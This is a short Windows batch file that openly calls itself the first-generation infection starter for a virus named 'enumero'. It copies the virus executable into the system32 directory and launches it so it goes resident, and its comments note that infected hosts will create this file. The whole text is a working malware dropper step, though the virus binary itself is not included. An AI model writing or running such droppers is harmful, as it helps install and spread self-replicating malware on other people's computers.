@echo off
ECHO **This is the NT first generation infection starter**
ECHO enumero must have a copy of itself in your system directory since
ECHO this is first generation. Infected hosts will create this file.
copy enum.exe enum.1st
copy enum.1st %windir%\system32\enumero.exe
ECHO Enumero about to go resident, not that this batch file will not
echo terminate because winNT waits for the launched process to
echo terminate.
%windir%\system32\enumero.exe

